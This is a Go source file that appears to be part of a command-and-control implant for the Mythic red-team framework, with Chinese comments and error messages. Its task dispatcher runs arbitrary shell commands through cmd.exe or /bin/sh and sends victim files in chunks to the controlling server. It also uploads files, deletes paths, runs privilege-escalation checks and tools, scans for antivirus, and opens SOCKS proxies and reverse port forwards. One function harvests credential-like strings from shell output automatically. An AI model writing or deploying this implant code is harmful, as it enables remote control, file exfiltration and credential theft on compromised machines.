package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func (c *AgentController) executeTask(task Task) TaskResponse {
	switch task.Command {
	case "echo":
		return executeEcho(task)
	case "shell":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "shell 仅允许在 beacon callback 上执行")
		}
		return executeShell(task)
	case "pty":
		if c.role != CallbackRoleSession {
			return roleError(task.ID, "requires session callback; run session_start first")
		}
		return c.executePty(task)
	case "ls":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "ls 仅允许在 beacon callback 上执行")
		}
		return executeLs(task)
	case "download":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "download 仅允许在 beacon callback 上执行")
		}
		return c.executeDownload(task)
	case "upload":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "upload 仅允许在 beacon callback 上执行")
		}
		return c.executeUpload(task)
	case "remove":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "remove 仅允许在 beacon callback 上执行")
		}
		return executeRemove(task)
	case "report":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "report 仅允许在 beacon callback 上执行")
		}
		return executeReport(task)
	case "sysinfo":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "sysinfo 仅允许在 beacon callback 上执行")
		}
		if !runtimeConfig.SysinfoEnabled {
			return roleError(task.ID, "当前 payload 未包含 sysinfo 命令")
		}
		return executeSysinfo(task)
	case "ps":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "ps 仅允许在 beacon callback 上执行")
		}
		if !runtimeConfig.ProcessListEnabled {
			return roleError(task.ID, "当前 payload 未包含 ps 命令")
		}
		return executeProcessList(task)
	case "avscan":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "avscan 仅允许在 beacon callback 上执行")
		}
		if !runtimeConfig.AVScanEnabled {
			return roleError(task.ID, "当前 payload 未包含 avscan 命令")
		}
		return executeAVScan(task)
	case "privesc_check":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "privesc_check 仅允许在 beacon callback 上执行")
		}
		return executePrivescCheck(task)
	case "privesc_tool":
		if c.role != CallbackRoleBeacon {
			return roleError(task.ID, "privesc_tool 仅允许在 beacon callback 上执行")
		}
		return executePrivescTool(task)
	case "session_start":
		return processSupervisor.StartSession(c, task)
	case "session_stop":
		if c.role != CallbackRoleSession {
			return roleError(task.ID, "session_stop 只能在 session callback 上执行")
		}
		return processSupervisor.StopSession(task)
	case "session_status":
		return processSupervisor.Status(task)
	case "socks":
		if c.role != CallbackRoleSession {
			return roleError(task.ID, "requires session callback; run session_start first")
		}
		return c.executeSocksStart(task)
	case "socks_stop":
		if c.role != CallbackRoleSession {
			return roleError(task.ID, "requires session callback; run session_start first")
		}
		return c.executeSocksStop(task)
	case "rpfwd":
		if c.role != CallbackRoleSession {
			return roleError(task.ID, "requires session callback; run session_start first")
		}
		return c.executeRpfwdStart(task)
	case "rpfwd_stop":
		if c.role != CallbackRoleSession {
			return roleError(task.ID, "requires session callback; run session_start first")
		}
		return c.executeRpfwdStop(task)
	case "exit":
		return c.executeExit(task)
	default:
		return TaskResponse{
			TaskID:     task.ID,
			UserOutput: fmt.Sprintf("未知命令: %s", task.Command),
			Completed:  true,
			Status:     "error: command not found",
		}
	}
}

func executeEcho(task Task) TaskResponse {
	var params struct {
		Text string `json:"text"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	return TaskResponse{TaskID: task.ID, UserOutput: params.Text, Completed: true, Status: "success"}
}

func executeShell(task Task) TaskResponse {
	var params struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", params.Command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", params.Command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return TaskResponse{
			TaskID:          task.ID,
			UserOutput:      string(output) + "\n错误: " + err.Error(),
			Completed:       true,
			Status:          "error: execution failed",
			ProcessResponse: buildShellProcessResponse(params.Command, string(output)),
		}
	}
	return TaskResponse{
		TaskID:          task.ID,
		UserOutput:      string(output),
		Completed:       true,
		Status:          "success",
		ProcessResponse: buildShellProcessResponse(params.Command, string(output)),
	}
}

func executeReport(task Task) TaskResponse {
	var params struct {
		Summary         string `json:"summary"`
		ArtifactType    string `json:"artifact_type"`
		ArtifactMessage string `json:"artifact_message"`
		CredentialType  string `json:"credential_type"`
		Realm           string `json:"realm"`
		Account         string `json:"account"`
		Credential      string `json:"credential"`
		Comment         string `json:"comment"`
		Metadata        string `json:"metadata"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}

	processPayload := ProcessResponseEnvelope{
		Kind:    "report",
		Summary: strings.TrimSpace(params.Summary),
	}
	if strings.TrimSpace(params.ArtifactMessage) != "" {
		artifactType := strings.TrimSpace(params.ArtifactType)
		if artifactType == "" {
			artifactType = "Process Create"
		}
		processPayload.Artifacts = append(processPayload.Artifacts, ReportArtifact{BaseArtifact: artifactType, Artifact: strings.TrimSpace(params.ArtifactMessage)})
	}
	if strings.TrimSpace(params.Credential) != "" {
		processPayload.Credentials = append(processPayload.Credentials, ReportCredential{
			CredentialType: normalizeCredentialType(params.CredentialType),
			Realm:          strings.TrimSpace(params.Realm),
			Account:        strings.TrimSpace(params.Account),
			Credential:     strings.TrimSpace(params.Credential),
			Comment:        strings.TrimSpace(params.Comment),
			Metadata:       strings.TrimSpace(params.Metadata),
		})
	}
	if len(processPayload.Artifacts) == 0 && len(processPayload.Credentials) == 0 && processPayload.Summary == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 至少提供 summary、artifact_message 或 credential", Completed: true, Status: "error: empty report"}
	}

	summary := processPayload.Summary
	if summary == "" {
		summary = fmt.Sprintf("已提交结构化报告: artifacts=%d credentials=%d", len(processPayload.Artifacts), len(processPayload.Credentials))
	}
	return TaskResponse{TaskID: task.ID, UserOutput: summary, Completed: true, Status: "success", ProcessResponse: processPayload}
}

func executeLs(task Task) TaskResponse {
	var params struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	if params.Path == "" {
		params.Path = "."
	}
	targetPath, err := filepath.Abs(params.Path)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法解析绝对路径: " + err.Error(), Completed: true, Status: "error: invalid path"}
	}
	info, err := os.Stat(targetPath)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: " + err.Error(), Completed: true, Status: "error: cannot read path"}
	}

	fileBrowserData, err := buildFileBrowserEntry(targetPath, info)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 构造文件浏览数据失败: " + err.Error(), Completed: true, Status: "error: cannot format file browser data"}
	}

	var output strings.Builder
	if info.IsDir() {
		entries, err := os.ReadDir(targetPath)
		if err != nil {
			return TaskResponse{TaskID: task.ID, UserOutput: "错误: " + err.Error(), Completed: true, Status: "error: cannot read directory", FileBrowser: fileBrowserData}
		}
		files := make([]map[string]any, 0, len(entries))
		for _, entry := range entries {
			entryInfo, err := entry.Info()
			if err != nil {
				continue
			}
			childPath := filepath.Join(targetPath, entry.Name())
			files = append(files, buildFileBrowserChild(childPath, entryInfo))
			output.WriteString(fmt.Sprintf("%s %10d %s %s\n", entryInfo.Mode().String(), entryInfo.Size(), entryInfo.ModTime().Format("2006-01-02 15:04:05"), entry.Name()))
		}
		if browserMap, ok := fileBrowserData.(map[string]any); ok {
			browserMap["files"] = files
		}
	} else {
		output.WriteString(fmt.Sprintf("%s %10d %s %s\n", info.Mode().String(), info.Size(), info.ModTime().Format("2006-01-02 15:04:05"), info.Name()))
	}

	return TaskResponse{TaskID: task.ID, UserOutput: output.String(), Completed: true, Status: "success", FileBrowser: fileBrowserData}
}

func (c *AgentController) executeDownload(task Task) TaskResponse {
	const chunkSize = 512000

	var params struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	targetPath := strings.TrimSpace(params.Path)
	if targetPath == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: path 不能为空", Completed: true, Status: "error: invalid path"}
	}
	absPath, err := filepath.Abs(targetPath)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法解析绝对路径: " + err.Error(), Completed: true, Status: "error: invalid path"}
	}
	fileInfo, err := os.Stat(absPath)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: " + err.Error(), Completed: true, Status: "error: cannot access file"}
	}
	if fileInfo.IsDir() {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: download 当前仅支持文件，不支持目录", Completed: true, Status: "error: path is directory"}
	}

	fileHandle, err := os.Open(absPath)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法打开文件: " + err.Error(), Completed: true, Status: "error: cannot open file"}
	}
	defer fileHandle.Close()

	totalChunks := int((fileInfo.Size() + chunkSize - 1) / chunkSize)
	if totalChunks == 0 {
		totalChunks = 1
	}
	fileID, err := c.registerDownload(task.ID, absPath, filepath.Base(absPath), totalChunks, chunkSize)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法登记下载: " + err.Error(), Completed: true, Status: "error: download registration failed"}
	}
	for chunkNum := 1; chunkNum <= totalChunks; chunkNum++ {
		chunk := make([]byte, chunkSize)
		n, readErr := io.ReadFull(fileHandle, chunk)
		if readErr != nil && readErr != io.EOF && readErr != io.ErrUnexpectedEOF {
			return TaskResponse{TaskID: task.ID, UserOutput: "错误: 读取文件失败: " + readErr.Error(), Completed: true, Status: "error: file read failed"}
		}
		if n == 0 {
			break
		}
		if err := c.sendDownloadChunk(task.ID, fileID, chunkNum, chunkSize, chunk[:n]); err != nil {
			return TaskResponse{TaskID: task.ID, UserOutput: "错误: 发送下载分块失败: " + err.Error(), Completed: true, Status: "error: download chunk failed"}
		}
	}

	return TaskResponse{TaskID: task.ID, UserOutput: fmt.Sprintf("文件已传输到 Mythic: %s (%d bytes)", absPath, fileInfo.Size()), Completed: true, Status: "success"}
}

func (c *AgentController) executeUpload(task Task) TaskResponse {
	const chunkSize = 512000

	var params struct {
		FileID   string `json:"file_id"`
		Filename string `json:"filename"`
		Path     string `json:"path"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	if strings.TrimSpace(params.FileID) == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: file_id 不能为空", Completed: true, Status: "error: missing file_id"}
	}

	targetPath := resolveUploadTargetPath(params.Path, params.Filename, params.FileID)
	if targetPath == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法解析上传目标路径", Completed: true, Status: "error: invalid target path"}
	}

	if err := os.MkdirAll(filepath.Dir(targetPath), 0o755); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法创建目录: " + err.Error(), Completed: true, Status: "error: cannot create directory"}
	}

	fileHandle, err := os.Create(targetPath)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法创建文件: " + err.Error(), Completed: true, Status: "error: cannot create file"}
	}
	defer fileHandle.Close()

	totalBytes := 0
	for chunkNum := 1; ; chunkNum++ {
		chunkResp, err := c.requestUploadChunk(task.ID, params.FileID, chunkNum, chunkSize, targetPath)
		if err != nil {
			_ = os.Remove(targetPath)
			return TaskResponse{TaskID: task.ID, UserOutput: "错误: 获取上传分块失败: " + err.Error(), Completed: true, Status: "error: upload chunk failed"}
		}
		if len(chunkResp.ChunkData) > 0 {
			n, err := fileHandle.Write(chunkResp.ChunkData)
			if err != nil {
				_ = os.Remove(targetPath)
				return TaskResponse{TaskID: task.ID, UserOutput: "错误: 写入上传分块失败: " + err.Error(), Completed: true, Status: "error: file write failed"}
			}
			totalBytes += n
		}
		if chunkResp.TotalChunks <= 0 || chunkResp.ChunkNum >= chunkResp.TotalChunks {
			break
		}
	}

	return TaskResponse{TaskID: task.ID, UserOutput: fmt.Sprintf("文件已写入: %s (%d bytes)", targetPath, totalBytes), Completed: true, Status: "success"}
}

func executeRemove(task Task) TaskResponse {
	var params struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	if strings.TrimSpace(params.Path) == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: path 不能为空", Completed: true, Status: "error: invalid path"}
	}
	absPath, err := filepath.Abs(params.Path)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 无法解析绝对路径: " + err.Error(), Completed: true, Status: "error: invalid path"}
	}
	if _, err := os.Stat(absPath); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 路径不存在: " + err.Error(), Completed: true, Status: "error: path not found"}
	}
	if err := os.RemoveAll(absPath); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 删除失败: " + err.Error(), Completed: true, Status: "error: remove failed"}
	}
	return TaskResponse{
		TaskID:     task.ID,
		UserOutput: fmt.Sprintf("已删除: %s", absPath),
		Completed:  true,
		Status:     "success",
		RemovedFiles: []map[string]any{{
			"host": currentMythicHost(),
			"path": absPath,
		}},
	}
}

func (c *AgentController) executeExit(task Task) TaskResponse {
	go func() {
		time.Sleep(250 * time.Millisecond)
		processSupervisor.StopActiveSession()
		c.Stop()
	}()
	return TaskResponse{TaskID: task.ID, UserOutput: "Agent 正在优雅退出...", Completed: true, Status: "success"}
}

func buildFileBrowserEntry(targetPath string, info os.FileInfo) (any, error) {
	cleanPath := filepath.Clean(targetPath)
	parentPath := filepath.Dir(cleanPath)
	name := info.Name()
	if name == "" {
		name = cleanPath
	}
	if cleanPath == parentPath {
		parentPath = ""
	}
	return map[string]any{
		"host":               currentMythicHost(),
		"is_file":            !info.IsDir(),
		"permissions":        map[string]any{"mode": info.Mode().String()},
		"name":               name,
		"parent_path":        parentPath,
		"success":            true,
		"access_time":        info.ModTime().UnixMilli(),
		"modify_time":        info.ModTime().UnixMilli(),
		"size":               info.Size(),
		"update_deleted":     true,
		"set_as_user_output": false,
	}, nil
}

func buildFileBrowserChild(targetPath string, info os.FileInfo) map[string]any {
	return map[string]any{
		"is_file":     !info.IsDir(),
		"permissions": map[string]any{"mode": info.Mode().String()},
		"name":        filepath.Base(targetPath),
		"access_time": info.ModTime().UnixMilli(),
		"modify_time": info.ModTime().UnixMilli(),
		"size":        info.Size(),
	}
}

func (c *AgentController) registerDownload(taskID string, fullPath string, filename string, totalChunks int, chunkSize int) (string, error) {
	download := DownloadTransfer{
		TotalChunks: intPointer(totalChunks),
		ChunkSize:   intPointer(chunkSize),
		FullPath:    stringPointer(fullPath),
		FileName:    stringPointer(filename),
		Host:        stringPointer(currentMythicHost()),
	}
	resp, err := c.postDownloadMessages([]DownloadResponseMessage{{TaskID: taskID, Download: &download}})
	if err != nil {
		return "", err
	}
	for _, item := range resp.Responses {
		if item.TaskID == taskID && item.FileID != "" {
			return item.FileID, nil
		}
	}
	return "", fmt.Errorf("Mythic 未返回 file_id")
}

func (c *AgentController) sendDownloadChunk(taskID string, fileID string, chunkNum int, chunkSize int, chunkData []byte) error {
	encodedChunk := base64.StdEncoding.EncodeToString(chunkData)
	download := DownloadTransfer{
		FileID:    stringPointer(fileID),
		ChunkNum:  intPointer(chunkNum),
		ChunkData: stringPointer(encodedChunk),
		ChunkSize: intPointer(chunkSize),
	}
	_, err := c.postDownloadMessages([]DownloadResponseMessage{{TaskID: taskID, Download: &download}})
	return err
}

func (c *AgentController) postDownloadMessages(messages []DownloadResponseMessage) (*MythicMessageResponse, error) {
	payload := struct {
		Action    string                    `json:"action"`
		Responses []DownloadResponseMessage `json:"responses"`
	}{Action: "post_response", Responses: messages}
	respData, err := c.transport.Send(c.CallbackUUID(), payload, c.aesKey)
	if err != nil {
		return nil, err
	}
	var resp MythicMessageResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, fmt.Errorf("解析下载传输响应失败: %w", err)
	}
	if err := c.dispatchTopLevelMessages(&resp); err != nil {
		return nil, err
	}
	for _, item := range resp.Responses {
		if item.Status != "" && item.Status != "success" {
			return nil, fmt.Errorf("下载传输失败(task=%s): %s", item.TaskID, firstNonEmpty(item.Error, item.Status))
		}
	}
	return &resp, nil
}

func (c *AgentController) requestUploadChunk(taskID string, fileID string, chunkNum int, chunkSize int, fullPath string) (*struct {
	FileID      string
	TotalChunks int
	ChunkNum    int
	ChunkData   []byte
}, error) {
	resp, err := c.postUploadMessages([]UploadResponseMessage{{
		TaskID: taskID,
		Upload: &UploadTransfer{
			FileID:    stringPointer(fileID),
			ChunkNum:  chunkNum,
			ChunkSize: intPointer(chunkSize),
			FullPath:  stringPointer(fullPath),
			Host:      stringPointer(currentMythicHost()),
		},
	}})
	if err != nil {
		return nil, err
	}
	for _, item := range resp.Responses {
		if item.TaskID == taskID && item.FileID != "" {
			return &struct {
				FileID      string
				TotalChunks int
				ChunkNum    int
				ChunkData   []byte
			}{
				FileID:      item.FileID,
				TotalChunks: item.TotalChunks,
				ChunkNum:    item.ChunkNum,
				ChunkData:   item.ChunkData,
			}, nil
		}
	}
	return nil, fmt.Errorf("Mythic 未返回上传分块")
}

func (c *AgentController) postUploadMessages(messages []UploadResponseMessage) (*MythicMessageResponse, error) {
	payload := struct {
		Action    string                  `json:"action"`
		Responses []UploadResponseMessage `json:"responses"`
	}{Action: "post_response", Responses: messages}
	respData, err := c.transport.Send(c.CallbackUUID(), payload, c.aesKey)
	if err != nil {
		return nil, err
	}
	var resp MythicMessageResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, fmt.Errorf("解析上传传输响应失败: %w", err)
	}
	if err := c.dispatchTopLevelMessages(&resp); err != nil {
		return nil, err
	}
	for _, item := range resp.Responses {
		if item.Status != "" && item.Status != "success" {
			return nil, fmt.Errorf("上传传输失败(task=%s): %s", item.TaskID, firstNonEmpty(item.Error, item.Status))
		}
	}
	return &resp, nil
}

func resolveUploadTargetPath(requestedPath string, filename string, fileID string) string {
	cleanRequested := strings.TrimSpace(requestedPath)
	if cleanRequested == "" {
		cleanRequested = "."
	}
	absPath, err := filepath.Abs(cleanRequested)
	if err != nil {
		return ""
	}
	// Mythic 在部分上传场景下会把目标路径写成“目录/file_id”。
	// 如果我们已经拿到了原始文件名，就在 agent 侧恢复为“目录/文件名”。
	if filename != "" && fileID != "" && filepath.Base(absPath) == fileID {
		return filepath.Join(filepath.Dir(absPath), filename)
	}
	if info, err := os.Stat(absPath); err == nil && info.IsDir() {
		if filename == "" {
			filename = "uploaded_file"
		}
		return filepath.Join(absPath, filename)
	}
	if strings.HasSuffix(cleanRequested, string(os.PathSeparator)) || strings.HasSuffix(cleanRequested, "/") || strings.HasSuffix(cleanRequested, "\\") {
		if filename == "" {
			filename = "uploaded_file"
		}
		return filepath.Join(absPath, filename)
	}
	return absPath
}

func buildShellProcessResponse(command string, output string) ProcessResponseEnvelope {
	artifacts := []ReportArtifact{{BaseArtifact: "Process Create", Artifact: shellArtifactString(command)}}
	credentials := extractCredentialsFromText(output)
	summary := ""
	if len(credentials) > 0 {
		summary = fmt.Sprintf("自动登记 %d 条凭据", len(credentials))
	}
	return ProcessResponseEnvelope{
		Kind:        "shell_result",
		Command:     command,
		RawOutput:   output,
		Summary:     summary,
		Artifacts:   artifacts,
		Credentials: credentials,
	}
}

func shellArtifactString(command string) string {
	command = strings.TrimSpace(command)
	if runtime.GOOS == "windows" {
		return "cmd.exe /c " + command
	}
	return "/bin/sh -c " + command
}

func extractCredentialsFromText(text string) []ReportCredential {
	results := make([]ReportCredential, 0)
	seen := make(map[string]struct{})
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) != 2 {
			continue
		}
		left := strings.TrimSpace(parts[0])
		right := strings.TrimSpace(parts[1])
		if left == "" || right == "" {
			continue
		}
		credential := ReportCredential{CredentialType: "plaintext", Credential: right, Comment: "shell 输出自动提取"}
		switch {
		case strings.Contains(left, "@"):
			accountRealm := strings.SplitN(left, "@", 2)
			if len(accountRealm) != 2 || accountRealm[0] == "" || accountRealm[1] == "" {
				continue
			}
			credential.Account = accountRealm[0]
			credential.Realm = accountRealm[1]
		case strings.Contains(left, "\\"):
			realmAccount := strings.SplitN(left, "\\", 2)
			if len(realmAccount) != 2 || realmAccount[0] == "" || realmAccount[1] == "" {
				continue
			}
			credential.Realm = realmAccount[0]
			credential.Account = realmAccount[1]
		default:
			if strings.Contains(left, " ") || !looksCredentialValue(right) {
				continue
			}
			credential.Account = left
		}
		key := credential.CredentialType + "|" + credential.Realm + "|" + credential.Account + "|" + credential.Credential
		if _, exists := seen[key]; exists {
			continue
		}
		seen[key] = struct{}{}
		results = append(results, credential)
	}
	return results
}
